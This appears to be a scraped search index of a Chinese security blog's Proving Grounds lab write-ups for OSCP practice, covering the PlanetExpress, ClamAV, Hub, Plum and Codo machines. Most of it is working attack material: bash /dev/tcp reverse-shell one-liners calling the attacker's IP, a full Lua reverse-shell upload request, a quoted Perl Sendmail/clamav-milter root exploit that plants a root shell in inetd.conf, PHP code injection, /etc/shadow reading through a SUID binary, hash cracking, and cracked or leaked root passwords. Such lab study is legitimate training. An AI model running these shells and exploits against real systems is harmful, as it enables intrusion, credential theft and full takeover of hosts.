class=\"no-js\"\u003e \u003c!--\u003c![endif]--\u003e \u003chead\u003e \u003cmeta charset=\"utf-8\"\u003e 反向连接，这里外连最好用80，因为其他端口可能有限制外联： ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ python3 fpm.py 192.168.244.205 \"/var/www/html/planetexpress/index.php\" -c '\u003c?php passthru(\"bash -c \\\"bash -i \u003e\u0026 /dev/tcp/192.168.45.203/80 0\u003e\u00261\\\"\"); ?\u003e' | head ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["靶场"],"content":"PE www-data@planetexpress:~$ find / -perm -u=s -type f -exec ls -l {} \\; 2\u003e/dev/null \u003c / -perm -u=s -type f -exec ls -l {} \\; 2\u003e/dev/null -rwsr-xr-- 1 root messagebus 51184 Jul 5 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 436552 Jan 31 2020 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 10232 Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rws---r-x 1 root root 3644754 Jan 10 2022 /usr/sbin/relayd -rwsr-xr-x 1 root root 51280 Jan 10 2019 /usr/bin/mount -rwsr-xr-x 1 root root 63736 Jul 27 2018 /usr/bin/passwd -rwsr-xr-x 1 root root 63568 Jan 10 2019 /usr/bin/su -rwsr-xr-x 1 root root 34896 Apr 22 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 34888 Jan 10 2019 /usr/bin/umount -rwsr-xr-x 1 root root 54096 Jul 27 2018 /usr/bin/chfn -rwsr-xr-x 1 root root 44528 Jul 27 2018 /usr/bin/chsh -rwsr-xr-x 1 root root 44440 Jul 27 2018 /usr/bin/newgrp -rwsr-xr-x 1 root root 157192 Jan 20 2021 /usr/bin/sudo -rwsr-xr-x 1 root root 84016 Jul 27 2018 /usr/bin/gpasswd 注意到这个relayd命令，查看帮助 www-data@planetexpress:~$ /usr/sbin/relayd -h /usr/sbin/relayd -h Usage: relayd [options] [actions] Actions: default action start daemon -h show this help message -v show version info -k kill running daemon -s get running status -U hup (reload configs) -a [service] add service for relay -r [service] remove service for relay -i get real client ip -b [up|down] broadcast the DS boot state -R reopen the log file Options: -C [file] read config from file -d enable debug mode. will not run in background -P [file] set pid file for daemon -g [ip] remote source ip -n [port] remote source port 有个-C读取文件的选项，因为是suid权限，可以读取任何文件，而且该命令操作后，可导致原该权限文件被任何人可读。 拿到密码hash www-data@planetexpress:~/html/planetexpress/plugins$ ls -l /etc/shadow -rw-r----- 1 root shadow 940 Jan 10 2022 /etc/shadow www-data@planetexpress:~$ /usr/sbin/relayd -C /etc/shadow /usr/sbin/relayd -C /etc/shadow [ERR] 2023-12-19 12:50:51 config.cpp:1539 write [ERR] 2023-12-19 12:50:51 config.cpp:1213 open failed [/usr/etc/relayd/misc.conf.tmp.12217] [ERR] 2023-12-19 12:50:51 config.cpp:1189 bad json format [/etc/shadow] [ERR] 2023-12-19 12:50:51 invalid config file www-data@planetexpress:~$ ls -l /etc/shadow ls -l /etc/shadow -rw-r--r-- 1 root shadow 940 Jan 10 2022 /etc/shadow www-data@planetexpress:~$ head /etc/shadow head /etc/shadow root:$6$vkAzDkveIBc6PmO1$y8QyGSMqJEUxsDfdsX3nL5GsW7p/1mn5pmfz66RBn.jd7gONn0vC3xf8ga33/Fq57xMuqMquhB9MoTRpTTHVO1:19003:0:99999:7::: daemon:*:18555:0:99999:7::: bin:*:18555:0:99999:7::: sys:*:18555:0:99999:7::: sync:*:18555:0:99999:7::: games:*:18555:0:99999:7::: man:*:18555:0:99999:7::: lp:*:18555:0:99999:7::: mail:*:18555:0:99999:7::: news:*:18555:0:99999:7::: www-data@planetexpress:~$ 破解密码 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ hashcat -m 1800 1.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice] └─$ john 1.hash --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 ASIMD 2x]) Cost 1 (iteration count) is 5000 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status neverwant2saygoodbye (?) 1g 0:00:14:10 DONE (2023-12-20 02:21) 0.001176g/s 990.2p/s 990.2c/s 990.2C/s newbattle..nevada99 Use the \"--show\" option to display all of the cracked passwords reliably Session completed. www-data@planetexpress:~/html/planetexpress$ cat /home/astro/local.txt cat /home/astro/local.txt 4c019d06769bb528fd86b118803b7ba1 www-data@planetexpress:~/html/planetexpress$ su root su root Password: neverwant2saygoodbye id uid=0(root) gid=0(root) groups=0(root) ls -l /root/ total 4 -rw------- 1 root root 33 Dec 19 11:59 proof.txt cat /root/proof.txt 43adc185281166087180042464900510 ","date":"2023-12-20","objectID":"/posts/provinggrounds-planetexpress/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrounds PlanetExpress Writeup","uri":"/posts/provinggrounds-planetexpress/"},{"categories":["靶场"],"content":"ProvingGrouds ClamAV WriteUp","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"ClamAV 第8台，Linux系统，难度Easy，名称 ClamAV ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:1:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"端口扫描 ┌──(xavier㉿kali)-[~] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:18 CST Nmap scan report for 192.168.193.42 Host is up (0.16s latency). Not shown: 994 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0) 25/tcp open smtp Sendmail 8.13.4/8.13.4/Debian-3sarge3 80/tcp open http Apache httpd 1.3.33 ((Debian GNU/Linux)) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 199/tcp open smux Linux SNMP multiplexer 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.94 seconds 全端口扫描，补充端口如下： 60000/tcp open ssh OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0) 漏洞情况： Apache 1.3.34/1.3.33 (Ubuntu / Debian) - CGI TTY Privilege Escalation ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:2:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"Web 打开80端口，能看到字符串 01101001 01100110 01111001 01101111 01110101 01100100 01101111 01101110 01110100 01110000 01110111 01101110 01101101 01100101 01110101 01110010 01100001 01101110 00110000 00110000 01100010 二进制解码后就是： ifyoudontpwnmeuran00b ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:3:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"SMB 探测SMB空口令成功 ┌──(xavier㉿kali)-[~] └─$ crackmapexec smb 192.168.193.42 -u '' -p '' SMB 192.168.193.42 445 NONE [*] Unix (name:) (domain:) (signing:False) (SMBv1:True) SMB 192.168.193.42 445 NONE [+] \\: ┌──(xavier㉿kali)-[~] └─$ crackmapexec smb 192.168.193.42 -u '' -p '' --shares SMB 192.168.193.42 445 NONE [*] Unix (name:) (domain:) (signing:False) (SMBv1:True) SMB 192.168.193.42 445 NONE [+] \\: SMB 192.168.193.42 445 NONE [+] Enumerated shares SMB 192.168.193.42 445 NONE Share Permissions Remark SMB 192.168.193.42 445 NONE ----- ----------- ------ SMB 192.168.193.42 445 NONE print$ Printer Drivers SMB 192.168.193.42 445 NONE IPC$ IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig) SMB 192.168.193.42 445 NONE ADMIN$ IPC Service (0xbabe server (Samba 3.0.14a-Debian) brave pig) ","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:4:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"SMTP ┌──(xavier㉿kali)-[~] └─$ sudo nmap -n -r --min-rate=3500 -sSV 192.168.193.42 -T4 -p 25 --script=smtp* [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-17 14:40 CST Nmap scan report for 192.168.193.42 Host is up (0.16s latency). PORT STATE SERVICE VERSION 25/tcp open smtp Sendmail 8.13.4/8.13.4/Debian-3sarge3 | smtp-enum-users: | root | admin | administrator | webadmin | sysadmin | netadmin | guest | user | web |_ test |_smtp-open-relay: Server is an open relay (13/16 tests) | smtp-vuln-cve2010-4344: |_ The SMTP server is not Exim: NOT VULNERABLE | smtp-commands: localhost.localdomain Hello [192.168.45.174], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP |_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use \"HELP \u003ctopic\u003e\". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info Service Info: Host: localhost.localdomain; OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds 漏洞搜索 搜索box的名称，找到历史漏洞 ┌──(xavier㉿kali)-[~] └─$ searchsploit clamav ---------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------- --------------------------------- Clam Anti-Virus ClamAV 0.88.x - UPX Compressed PE File Heap Buffer Ov | linux/dos/28348.txt ClamAV / UnRAR - .RAR Handling Remote Null Pointer Dereference | linux/remote/30291.txt ClamAV 0.91.2 - libclamav MEW PE Buffer Overflow | linux/remote/4862.py ClamAV \u003c 0.102.0 - 'bytecode_vm' Code Execution | linux/local/47687.py ClamAV \u003c 0.94.2 - JPEG Parsing Recursive Stack Overflow (PoC) | multiple/dos/7330.c ClamAV Daemon 0.65 - UUEncoded Message Denial of Service | linux/dos/23667.txt ClamAV Milter - Blackhole-Mode Remote Code Execution (Metasploit) | linux/remote/16924.rb ClamAV Milter 0.92.2 - Blackhole-Mode (Sendmail) Code Execution (Meta | multiple/remote/9913.rb Sendmail with clamav-milter \u003c 0.91.2 - Remote Command Execution | multiple/remote/4761.pl ---------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------- --------------------------------- [Azerbaijan] ClamAV Bypassing | docs/azerbaijan/31685-[azerbaija ---------------------------------------------------------------------- --------------------------------- ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/8-ClamAV] └─$ searchsploit -m 4761 Exploit: Sendmail with clamav-milter \u003c 0.91.2 - Remote Command Execution URL: https://www.exploit-db.com/exploits/4761 Path: /usr/share/exploitdb/exploits/multiple/remote/4761.pl Codes: CVE-2007-4560 Verified: True File Type: ASCII text Copied to: /home/xavier/Desktop/OSCP/PG_Practice/8-ClamAV/4761.pl ### black-hole.pl ### Sendmail w/ clamav-milter Remote Root Exploit ### Copyright (c) 2007 Eliteboy ######################################################## use IO::Socket; print \"Sendmail w/ clamav-milter Remote Root Exploit\\n\"; print \"Copyright (C) 2007 Eliteboy\\n\"; if ($#ARGV != 0) {print \"Give me a host to connect.\\n\";exit;} print \"Attacking $ARGV[0]...\\n\"; $sock = IO::Socket::INET-\u003enew(PeerAddr =\u003e $ARGV[0], PeerPort =\u003e '25', Proto =\u003e 'tcp'); print $sock \"ehlo you\\r\\n\"; print $sock \"mail from: \u003c\u003e\\r\\n\"; print $sock \"rcpt to: \u003cnobody+\\\"|echo '31337 stream tcp nowait root /bin/sh -i' \u003e\u003e /etc/inetd.conf\\\"@localhost\u003e\\r\\n\"; print $sock \"rcpt to: \u003cnobody+\\\"|/etc/init.d/inetd restart\\\"@","date":"2023-12-17","objectID":"/posts/provinggrounds-clamav/:5:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds ClamAV WriteUp","uri":"/posts/provinggrounds-clamav/"},{"categories":["靶场"],"content":"ProvingGrouds Hugo WriteUp","date":"2023-12-12","objectID":"/posts/provinggrounds-hub/","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds Hub WriteUp","uri":"/posts/provinggrounds-hub/"},{"categories":["靶场"],"content":"第6台，Linux系统，难度Easy，名称 Hub ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -p- -sSV --script default,vuln 192.168.240.25 -T4 ┌──(xavier㉿kali)-[~/Desktop/OSCP] └─$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.240.25 -T4 结果 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http nginx 1.18.0 9999/tcp open ssl/http Barracuda Embedded Web Server 9999端口的http服务是个FuguHub 8.4，要设置管理员账户，使用如下： admin@admin.com admin password 8.1版本有个RCE历史漏洞。 ┌──(xavier㉿kali)-[~] └─$ searchsploit FuguHub ---------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------- --------------------------------- FuguHub 8.1 - Remote Code Execution | multiple/webapps/51550.py ---------------------------------------------------- --------------------------------- Shellcodes: No Results Papers: No Results 试下还能不能用 用管理身份登录后台，根据漏洞原理，通过Web端进行操作，上传文件，数据包如下； POST /fs/ HTTP/1.1 Host: 192.168.240.25:9999 Cookie: tzone=--480; z9ZAqJtI=75107ab8eed3d3b2a7d77a3e User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------427009261933411581191473311562 Content-Length: 742 Origin: https://192.168.240.25:9999 Referer: https://192.168.240.25:9999/fs/ Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Te: trailers Connection: close -----------------------------427009261933411581191473311562 Content-Disposition: form-data; name=\"file\"; filename=\"rev.lsp\" Content-Type: application/octet-stream \u003ch2\u003e Check ur nc listener on the port you put in \u003ch2\u003e \u003c?lsp if request:method() == \"GET\" then ?\u003e \u003c?lsp local host, port = \"192.168.45.197\", 443 local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close() ?\u003e \u003c?lsp else ?\u003e Wrong request method, goodBye! \u003c?lsp end ?\u003e -----------------------------427009261933411581191473311562-- ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/6-Hub] └─$ curl https://192.168.240.25:9999/rev.lsp -k ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/6-Hub] └─$ nc -nlvp 443 listening on [any] 443 ... connect to [192.168.45.197] from (UNKNOWN) [192.168.240.25] 43348 id uid=0(root) gid=0(root) groups=0(root) hostname debian ipconfig ifconfig ens192: flags=4163\u003cUP,BROADCAST,RUNNING,MULTICAST\u003e mtu 1500 inet 192.168.240.25 netmask 255.255.255.0 broadcast 192.168.240.255 inet6 fe80::250:56ff:feba:85a3 prefixlen 64 scopeid 0x20\u003clink\u003e ether 00:50:56:ba:85:a3 txqueuelen 1000 (Ethernet) RX packets 474 bytes 59756 (58.3 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 277 bytes 69440 (67.8 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u003cUP,LOOPBACK,RUNNING\u003e mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u003chost\u003e loop txqueuelen 1000 (Local Loopback) RX packets 104 bytes 9754 (9.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 104 bytes 9754 (9.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 pwd /var/www/html ls /root/ email4.txt proof.txt cat /root/proof.txt aebbd4df648371dc7572e5ed5589a98b ","date":"2023-12-12","objectID":"/posts/provinggrounds-hub/:0:0","tags":["OSCP","PG_Practice"],"title":"ProvingGrouds Hub WriteUp","uri":"/posts/provinggrounds-hub/"},{"categories":["靶场"],"content":"Proving Grounds Plum WriteUp","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["靶场"],"content":"plum intermediate 10 ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:0:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["靶场"],"content":"PortScan ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.196.28 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 22:17 CST Nmap scan report for 192.168.196.28 Host is up (0.14s latency). Not shown: 98 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) 80/tcp open http Apache httpd 2.4.56 ((Debian)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 8.33 seconds ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:1:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["靶场"],"content":"InitAccess pluxml ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ searchsploit pluxml ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ searchsploit -x php/webapps/18828.txt pluxml 版本5.8.7，searchsploit无漏洞。 弱口令admin，admin进入后台。 找了下网上，5.8.7有个后台修改静态页RCE，https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf 描述如下： ## 1 Application https://github.com/pluxml/PluXml ## 2 Introductory Remarks There is already an issue regarding a different RCE vulnerability (https://github.com/pluxml/PluXml/issues/321). In contrast to our vulnerability,said RCE only works when using the config file parameter with admin privileges,which is not possible as a moderator. ## 3 Description of the Vulnerability In the PluXml PHP blogging platform (v5.8.7), a user with the manager role can inject arbitrary PHP code that is executed on the server. As a consequence, remote code execution (RCE) becomes possible, as illustrated in this unlisted (non-public) youtube video: https://youtu.be/Gbe2UNCB0tY. ## 4 Steps to Reproduce the Exploit 1. Login with a manager account. 2. In the Administration menu, select static pages and edit one of the pages. 3. Insert PHP code with starting and closing tags \u003c?php CODE ?\u003e. 4. Save the changes and open the stored page. ## 5 Technical Description of the Vulnerability While the administrator role has the permission to edit PHP templates and, thus, can always execute arbitrary code, the manager role has no such privileges. Indeed, a manager can only edit so-called static - purely HTML-written- pages. However, in the file core/admin/statique.php and in the file core/admin/lib/class.plx.admin.php (in the function editStatique) no proper input sanitisation is done to filter PHP-opening- and closing-tags (\u003c?php and ?\u003e). As a consequence, the injected PHP code becomes executed on the server-side, even though it is integrated with HTML content. Additionally,note that an XSS-attack is also possible for a manager (proof of concept: by integrating \u003cscript\u003ealert(/xss/)\u003c/script\u003e) and hard to filter. 写入后成功输出。 尝试写webshell，发现无法动态解析执行，可能是一次性的，直接写shell。 \u003c?php echo '123\u003cbr\u003e'; system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.45.246/9001 0\u003e\u00261'\");?\u003e 再去加载页面，成功收到反弹shell ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ nc -nlvp 9001 listening on [any] 9001 ... connect to [192.168.45.246] from (UNKNOWN) [192.168.196.28] 52096 bash: cannot set terminal process group (784): Inappropriate ioctl for device bash: no job control in this shell www-data@plum:/var/www/html$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@plum:/var/www/html$ www-data@plum:/tmp$ cat /var/www/local.txt cat /var/www/local.txt 3eeae195eb57983b4e679071f3098211 ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:2:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["靶场"],"content":"PrivE ╔══════════╣ Modified interesting files in the last 5mins (limit 100) /var/www/html/data/statiques/001.static-1.php /var/www/html/data/configuration/statiques.xml /var/mail/www-data /var/log/journal/c71e29ed9c494834b5aab51454fe3ee0/system.journal /var/log/messages /var/log/btmp /var/log/syslog /var/log/kern.log /var/log/daemon.log /var/log/auth.log /tmp/GCONV_PATH=./.pkexec /tmp/passwd.bak /tmp/.pkexec/gconv-modules /tmp/1.txt 这里卡了很久，对/var/mail/www-data这个有过怀疑，但是一直用head，tail，grep pass的形式看得，没有打开看，还是有想偷懒的心。 www-data@plum:/tmp$ cat /var/mail/www-data cat /var/mail/www-data From root@localhost Fri Aug 25 06:31:47 2023 Return-path: \u003croot@localhost\u003e Envelope-to: www-data@localhost Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400 Received: from root by localhost with local (Exim 4.94.2) (envelope-from \u003croot@localhost\u003e) id 1qZU6V-0000El-Pw for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400 To: www-data@localhost From: root@localhost Subject: URGENT - DDOS ATTACK\" Reply-to: root@localhost Message-Id: \u003cE1qZU6V-0000El-Pw@localhost\u003e Date: Fri, 25 Aug 2023 06:31:47 -0400 We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user: root:6s8kaZZNaZZYBMfh2YEW Thanks, Administrator From MAILER-DAEMON Mon Dec 04 10:02:09 2023 Return-path: \u003c\u003e Envelope-to: www-data@localhost Delivery-date: Mon, 04 Dec 2023 10:02:09 -0500 Received: from Debian-exim by localhost with local (Exim 4.94.2) id 1rAASX-0001gi-JO for www-data@localhost; Mon, 04 Dec 2023 10:02:09 -0500 X-Failed-Recipients: debian@localhost Auto-Submitted: auto-replied From: Mail Delivery System \u003cMailer-Daemon@localhost\u003e To: www-data@localhost References: \u003cE1rAASX-0001fo-IY@localhost\u003e Content-Type: multipart/report; report-type=delivery-status; boundary=1701702129-eximdsn-2095242606 MIME-Version: 1.0 Subject: Mail delivery failed: returning message to sender Message-Id: \u003cE1rAASX-0001gi-JO@localhost\u003e Date: Mon, 04 Dec 2023 10:02:09 -0500 --1701702129-eximdsn-2095242606 Content-type: text/plain; charset=us-ascii This message was created automatically by mail delivery software. A message that you sent could not be delivered to one or more of its recipients. This is a permanent error. The following address(es) failed: debian@localhost (generated from root@localhost) Unrouteable address --1701702129-eximdsn-2095242606 Content-type: message/delivery-status Reporting-MTA: dns; localhost Action: failed Final-Recipient: rfc822;root@localhost Status: 5.0.0 --1701702129-eximdsn-2095242606 Content-type: message/rfc822 Return-path: \u003cwww-data@localhost\u003e Received: from www-data by localhost with local (Exim 4.94.2) (envelope-from \u003cwww-data@localhost\u003e) id 1rAASX-0001fo-IY for root@localhost; Mon, 04 Dec 2023 10:02:09 -0500 To: root@localhost Auto-Submitted: auto-generated Subject: *** SECURITY information for localhost *** From: www-data \u003cwww-data@localhost\u003e Message-Id: \u003cE1rAASX-0001fo-IY@localhost\u003e Date: Mon, 04 Dec 2023 10:02:09 -0500 localhost : Dec 4 15:02:09 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list --1701702129-eximdsn-2095242606-- From MAILER-DAEMON Mon Dec 04 10:06:20 2023 Return-path: \u003c\u003e Envelope-to: www-data@localhost Delivery-date: Mon, 04 Dec 2023 10:06:20 -0500 Received: from Debian-exim by localhost with local (Exim 4.94.2) id 1rAAWa-0004Mp-Vl for www-data@localhost; Mon, 04 Dec 2023 10:06:20 -0500 X-Failed-Recipients: debian@localhost Auto-Submitted: auto-replied From: Mail Delivery System \u003cMailer-Daemon@localhost\u003e To: www-data@localhost References: \u003cE1rAAWa-0004Mm-VK@localhost\u003e Content-Type: multipart/report; report-type=delivery-status; boundary=1701702380-eximdsn-199798543 MIME-Version: 1.0 Subject: Mail delivery failed: returning message to sender Message-Id: \u003cE1rAAWa-0004Mp-Vl@localhost\u003e Date: Mon, 04 Dec 2023 10:06:20 -0500 --1701702380-eximdsn-199798543 Content-type: text/plain; charset=us-ascii This message was ","date":"2023-12-05","objectID":"/posts/proving-grounds-plum/:3:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Plum WriteUp","uri":"/posts/proving-grounds-plum/"},{"categories":["靶场"],"content":"Codo Easy 10p ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:0:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["靶场"],"content":"端口扫描 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ sudo nmap -n -r --min-rate=3500 -F -sSV 192.168.196.23 [sudo] xavier 的密码： Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-04 21:22 CST Nmap scan report for 192.168.196.23 Host is up (0.13s latency). Not shown: 98 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.04 seconds ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:1:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["靶场"],"content":"InitAccess ","date":"2023-12-04","objectID":"/posts/proving-grounds-codo/:2:0","tags":["OSCP","PG_Practice"],"title":"Proving Grounds Codo WriteUp","uri":"/posts/proving-grounds-codo/"},{"categories":["靶场"],"content":"Web弱口令 默认密码：admin：admin登录后台 找到历史漏洞 ┌──(xavier㉿kali)-[~/Desktop/OSCP/PG_Practice/2-codo] └─$ python3 50978.py -t http://192.168.196.23 -u admin -p admin -i 192.168.45.246 -n 9001 CODOFORUM V5.1 ARBITRARY FILE UPLOAD TO RCE(Authenticated) ______ _______ ____ ___ ____ ____ _____ _ ___ ____ _ _ / ___\\ \\ / / ____| |___ \\ / _ \\___ \\|___ \\ |___ // |( _ ) ___|| || | | | \\ \\ / /| _| _____ __) | | | |__) | __) |____ |_ \\| |/ _ \\___ \\| || |_ | |___ \\ V / | |__|_____/ __/| |_| / __/ / __/_____|__) | | (_) |__) |__ _| \\____| \\_/ |_____| |_____|\\___/_____|_____| |____/|_|\\___/____/ |_| Exploit found and written by: @vikaran101 [+] Login successful [*] Checking webshell status and executing... [-] Something went wrong, please try uploading the shell manually(admin panel \u003e global settings \u003e change forum logo \u003e upload and access from http://192.168.196.23/sites/default/assets/img/attachments/[file.php]) 脚本没打成功，手动打一下 文件上传成功 POST /admin/index.php?page=config HTTP/1.1 Host: 192.168.196.23 User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------337198322926933256222094173604 Content-Length: 3791 Origin: http://192.168.196.23 Connection: close Referer: http://192.168.196.23/admin/index.php?page=config Cookie: user_id=1; PHPSESSID=plvs2ivgu59ff61gm3qrukmgmo; cf=0 Upgrade-Insecure-Requests: 1 -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"site_title\" CODOLOGIC -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"site_description\" codoforum - Enhancing your forum experience with next generation technology! -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"admin_email\" admin@codologic.com -----------------------------337198322926933256222094173604 Content-Disposition: form-data; name=\"default_timezone\" Europe/London -----------------------------337198322926933256222094173604 